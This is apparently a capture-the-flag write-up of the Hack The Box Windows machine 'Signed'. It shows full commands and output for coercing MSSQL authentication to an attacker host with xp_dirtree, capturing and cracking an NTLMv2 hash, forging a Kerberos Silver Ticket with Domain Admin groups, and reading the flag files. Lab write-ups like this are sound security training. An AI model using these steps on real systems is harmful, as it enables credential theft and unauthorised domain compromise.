---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - SilverTicket
---
# Overview

| Name        | Signed      |
| ----------- | ----------- |
| OS          | Windows     |
| Base Points | Medium [30] |
| Status      | Done        |
As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: `scott` / `Sm230#C5NatH`
# Recon
## Nmap

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ sudo nmap -T4 -sC -sV --min-rate 5000 10.10.11.90
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-12 04:07 PDT
Nmap scan report for 10.10.11.90
Host is up (0.48s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info:
|   10.10.11.90:1433:
|     Version:
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-10-12T11:07:49+00:00; 0s from scanner time.
| ms-sql-ntlm-info:
|   10.10.11.90:1433:
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-12T10:09:15
|_Not valid after:  2055-10-12T10:09:15
```
# Initial Foothold
## Responder

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py scott:Sm230#C5NatH@10.10.11.90
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL (scott  guest@master)> EXEC xp_dirtree '\\10.10.14.126\share', 1, 1;
subdirectory   depth   file
------------   -----   ----
SQL (scott  guest@master)>
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ sudo responder -I tun0

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.126]
    Responder IPv6             [dead:beef:2::107c]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-ORVP06KOF2Z]
    Responder Domain Name      [OL10.LOCAL]
    Responder DCE-RPC Port     [47649]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.90
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:314487c29e6c7daf:3566721B9405E6B3EA360B76E8A2F94B:0101000000000000806E60E12E3BDC01ECADF1357299FD6100000000020008004F004C003100300001001E00570049004E002D004F00520056005000300036004B004F00460032005A0004003400570049004E002D004F00520056005000300036004B004F00460032005A002E004F004C00310030002E004C004F00430041004C00030014004F004C00310030002E004C004F00430041004C00050014004F004C00310030002E004C004F00430041004C0007000800806E60E12E3BDC01060004000200000008003000300000000000000000000000003000000DC0D8E96FAB09968822E6E7E4EF9BD20A6C01AFD39E370895179B0D5E6BCBD40A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100320036000000000000000000
```

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

or,

```bash
john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

We get `mssqlsvc:purPLE9795!@` then calculate the NT for it:

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ echo -n 'purPLE9795!@' | iconv -f UTF-8 -t UTF-16LE | openssl md4
MD4(stdin)= ef699384c3285c54128a3ee1ddb1a0cc
```

- `echo -n 'purPLE9795!@'` - Outputs the password without newline
- `iconv -f UTF-8 -t UTF-16LE` - Converts to UTF-16 Little Endian (Windows format)
- `openssl md4` - Calculates MD4 hash (NT hash algorithm)

- Windows stores passwords as NT hashes (MD4 of UTF-16LE password)
- Kerberos RC4 encryption uses this NT hash as the key
- We need to replicate how Windows would calculate the hash

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py SIGNED/mssqlsvc@10.10.11.90 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  guest@master)> SELECT name FROM sys.server_principals WHERE IS_MEMBER(name) = 1 AND type_desc = 'WINDOWS_GROUP';
name
-------------------
SIGNED\Domain Users
```

Lets see all groups now.

```bash
SQL (SIGNED\mssqlsvc  guest@master)> SELECT name, type_desc FROM sys.server_principals WHERE type_desc = 'WINDOWS_GROUP';
name                  type_desc
-------------------   -------------
SIGNED\IT             WINDOWS_GROUP

SIGNED\Domain Users   WINDOWS_GROUP
```

Lets try to get to IT user.
## Silver Ticket Attack

A **Silver Ticket** is a forged Kerberos service ticket that gives you access to a specific service (like MSSQL). Unlike Golden Tickets that give domain-wide access, Silver Tickets are service-specific.

Lets try Silver Ticket attack. But first.

```bash
SQL (SIGNED\mssqlsvc  guest@master)> SELECT SUSER_SID('SIGNED\IT');

-----------------------------------------------------------
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'

SQL (SIGNED\mssqlsvc  guest@master)>
```

Convert to string format:

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ python3 -c "import binascii; sid=binascii.unhexlify('0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'); print('S-{}-{}-{}'.format(sid[0], int.from_bytes(sid[2:8],'big'), '-'.join(str(int.from_bytes(sid[8+i*4:12+i*4],'little')) for i in range(sid[1]))))"
S-1-5-21-4088429403-1159899800-2753317549-1105
```

```bash
impacket-ticketer -nthash "ef699384c3285c54128a3ee1ddb1a0cc" \
  # Uses mssqlsvc's password as the "ink" to print the fake ID
  -domain-sid "S-1-5-21-4088429403-1159899800-2753317549" \
  # Says this ID is for the SIGNED company
  -spn "MSSQLSvc/DC01.SIGNED.HTB" \
  # Says this ID is for the SQL Server door
  -groups 512,1105 \
  # Adds these security clearance badges:
  # 512 = Executive badge (Domain Admin) 
  # 1105 = IT Admin badge (IT group)
  -user-id 1103 \
  # Your employee number
  mssqlsvc
  # Your name on the ID
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ impacket-ticketer -nthash "ef699384c3285c54128a3ee1ddb1a0cc" \
  -domain-sid "S-1-5-21-4088429403-1159899800-2753317549" \
  -domain "SIGNED.HTB" \
  -spn "MSSQLSvc/DC01.SIGNED.HTB" \
  -groups 512,1105 \
  -user-id 1103 \
  mssqlsvc
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for SIGNED.HTB/mssqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```

We created a **forged Kerberos ticket** called `mssqlsvc.ccache` that contains:

- **Username**: `mssqlsvc` (the SQL service account)
- **Groups**: `Domain Admins (512)` + `IT Group (1105)`
- **Service**: MSSQL on `DC01.SIGNED.HTB`
- **Encrypted with**: mssqlsvc's NT hash as the key

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ export KRB5CCNAME=mssqlsvc.ccache

┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -k DC01.SIGNED.HTB
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');

-
1
```

Its `1` which means we are sysadmin.

```bash
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Users\mssqlsvc\Desktop\user.txt', SINGLE_CLOB) AS Contents;
BulkColumn
---------------------------------------
b'85ed5dc0f036f3efd82f99696f5878e6\r\n'

SQL (SIGNED\mssqlsvc  dbo@master)> SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;
BulkColumn
---------------------------------------
b'9527e9af8a8e0a52936fe378f68f2ee5\r\n'
```

---